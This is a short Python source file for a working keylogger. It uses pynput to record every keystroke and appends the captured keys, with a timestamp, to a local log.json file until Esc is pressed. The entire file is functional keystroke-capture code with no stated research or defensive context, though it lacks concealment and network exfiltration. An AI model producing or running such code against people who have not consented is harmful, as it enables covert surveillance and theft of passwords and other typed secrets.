import json
from datetime import datetime
from pynput import keyboard


class KeyLogger:
    def __init__(self, file="log.json"):
        self.file, self.keys = file, []

    def on_press(self, key):
        if key == keyboard.Key.esc:
            self.save()
            return False
        self.keys.append(getattr(key, 'char', str(key)))

    def save(self):
        with open(self.file, "a", encoding="utf-8") as f:
            json.dump({"time": datetime.now().strftime("%H:%M:%S"), "keys": self.keys}, f, ensure_ascii=False, indent=4)

    def start(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()


if __name__ == "__main__":
    KeyLogger().start()
